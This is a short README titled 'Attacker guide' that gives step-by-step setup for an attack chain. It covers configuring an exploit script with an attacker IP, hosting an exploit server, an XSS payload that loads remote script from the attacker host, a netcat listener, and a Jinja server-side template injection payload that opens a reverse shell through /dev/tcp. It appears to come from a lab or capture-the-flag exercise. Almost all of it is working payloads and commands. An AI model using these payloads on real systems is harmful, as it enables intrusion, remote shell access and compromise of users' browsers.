# Attacker guide

### Setup exploit script:
Change ATTACKER_IP in exploit.js

### Host exploit server:

```sh
python3 attacker.py
```

### XSS payload:

```html
<script src="http://<attacker_ip>/exploit.js"></script>
```

### Setup a listener:

```sh
nc -lvnp 4444
```

### SSTI payload:

```jinja
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('sh -i >& /dev/tcp/<ATTACKER_IP>/4444 0>&1').read() }}
```
